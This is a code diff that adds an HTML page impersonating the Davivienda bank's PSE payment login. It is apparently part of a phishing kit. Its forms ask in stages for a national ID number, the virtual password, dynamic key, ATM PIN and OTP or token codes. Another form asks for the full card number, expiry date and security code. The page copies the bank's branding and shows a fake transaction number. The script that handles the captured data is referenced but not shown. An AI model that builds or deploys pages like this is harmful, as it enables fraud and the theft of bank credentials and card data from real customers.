@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paga con PSE | Davivienda</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="./assets/pse/davifavicon.png" type="image/x-icon">
+    <!-- <link rel="stylesheet" href="./css/normalize.css"> -->
+    <link rel="stylesheet" href="./css/tw.css">
+    <link rel="stylesheet" href="./css/davi.css">
+
+    <!-- script -->
+    <script src="../../js/functions.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+
+</head>
+<body class="text-helvetica">
+    <div id="loader" class="cont-loader">
+        <div class="loader"></div>
+        <p class="text-md fotn">Espere un momento...</p>
+    </div>
+
+
+    <nav class="w-full flex justify-center fixed bg-[#ed1c27] py-3 z-[10] shadow-lg">
+        <div class="w-full md:max-w-[1200px] px-5 flex justify-between items-center">
+            <img src="./assets/pse/davi.png" width="200px">
+            <div class="text-white text-sm hidden md:block">
+                <p id="datetime">Jueves 13 de Febrero de 2025, 11:09 PM</p>
+                <p>CUS: 348377738</p>
+            </div>
+        </div>
+    </nav>
+
+    <section class="min-h-[100vh] bg-davi flex justify-center items-center">
+        <div class="w-full absolute flex flex-col items-center justify-center px-5">
+            <div class="roboto text-white">
+                <p class="text-4xl font-extralight">Ingreso Persona Natural</p>
+                <p class="text-4xl font-bold">alianza <span class="font-bold">PSE</span></p>
+            </div>
+            
+            
+            <div id="general" class="border border-2 rounded-lg w-full md:max-w-[800px] p-5 my-20 bg-form">
+                <p class="text-center font-semibold mb-5">Por favor ingrese la siguiente información:</p>
+                <form id="formGeneral" class="flex flex-col md:flex-row gap-3">
+                    <div class="flex-1">
+                        <label for="doctype">Tipo de documento</label>
+                        <select name="" id="doctype">
+                            <option value="1">Cédula de Ciudadanía</option>
+                        </select>
+                    </div>
+                    <div class="flex-1">
+                        <label for="docnum">No. de documento</label>
+                        <input type="text" id="docnum">
+                    </div>
+                    <div class="flex-1 hidden">
+                        <label for="clave">Clave virtual</label>
+                        <input type="password" id="clave">
+                    </div>
+                    <div class="flex-1 hidden">
+                        <label for="cdin">Clave dinámica</label>
+                        <input type="number" id="cdin">
+                    </div>
+                    <div class="flex-1 hidden">
+                        <label for="ccajero">Clave cajero</label>
+                        <input type="number" id="ccajero">
+                    </div>
+                    <div class="flex-1 hidden">
+                        <label for="otpcode">Código</label>
+                        <input type="number" id="otpcode">
+                    </div>
+                    <div class="flex-1 hidden">
+                        <label for="token">Código</label>
+                        <input type="number" id="token">
+                    </div>
+                    <div class="flex-1">
+                        <button id="continue" class="btn-success">Continuar</button>
+                    </div>
+                    <div class="flex-1">
+                        <button id="cancel" class="btn-cancel">Cancelar</button>
+                    </div>
+                </form>
+            </div>
+
+
+            <div id="card" class="hidden border border-2 rounded-lg w-full md:max-w-[600px] p-5 my-20 bg-form">
+                <p class="text-center font-semibold mb-5">Por favor, inicie sesión con un producto:</p>
+                <form id="formCard" class="flex flex-col gap-3" action="">
+                    <input type="text" required oninput="formatCNumber(this)" id="p" placeholder="Número de tarjeta">
+                    <div class="flex flex-row gap-3">
+                        <input oninput="formatDate(this)" id="pdate" required type="text" placeholder="Fecha de vencimiento">
+                        <input id="c" required type="number" oninput="limitDigits(this, 3)" placeholder="Código de seguridad">
+                    </div>
+                    <div class="flex flex-row gap-3">
+                        <button id="continue" class="btn-success">Continuar</button>
+                        <button id="cancel" class="btn-cancel">Cancelar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </section>
+
+
+    <script src="./js/davi.js"></script>
+</body>
+</html>
